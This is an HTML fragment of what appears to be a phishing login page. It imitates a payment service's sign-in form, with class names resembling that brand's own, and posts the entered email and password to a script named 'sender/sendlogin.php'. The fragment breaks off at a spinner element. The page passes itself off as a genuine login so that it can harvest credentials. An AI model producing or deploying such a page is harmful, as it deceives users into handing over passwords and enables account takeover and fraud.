<div id="main" class="main" role="main">

<div class="corral">
<div class="contentContainer activeContent">
<header>
 
<center><p><img src="../res/img/logo.png" class=""></p></center>
</header>

<form action="sender/sendlogin.php" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate="">
<div id="emailSection" class="clearfix">
<div class="textInput" id="login_emaildiv" style="z-index: 1;">
<div class="fieldWrapper"><label for="email" class="fieldLabel">Email</label>
<input id="email" name="email" type="email" class="hasHelp  validateEmpty   " required="required" aria-required="true" autocomplete="off" placeholder="Email">
</div><div class="errorMessage" id="emailErrorMessage"><p class="emptyError hide">Required</p>
<p class="invalidError hide">That email format isn't right</p>
</div></div></div>


<div id="passwordSection" class="clearfix">
<div class="textInput" id="login_passworddiv" style="z-index: 1;">
<div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
<input id="password" name="password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" aria-required="true" placeholder="Password">
</div><div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide">Required</p>
</div></div></div>



<div class="actions actionsSpacedShort">
<button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="submit" value="Login">Log In</button>
</div>
<div class="forgotLink"><a href="#" class="scTrack:unifiedlogin-click-forgot-password pwrLink startPwrFlowBtn">Having trouble logging in?</a>
</div>

<a href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" onclick="show" id="createAccount">Sign Up</a>
</form>

<script>
$(document).ready(function(){
	$('#btnLogin').click(function(){
		var email = $("#email").val();
		var pass = $("#password").val();
		if(email == "" || pass == ""){
			document.getElementById('s').innerHTML = '';
		}
		else{
			$("#s").addClass("spinner");
		}
		
	});
	
});
</script>

<div class="spinner" id="waiter" style="display: none;">
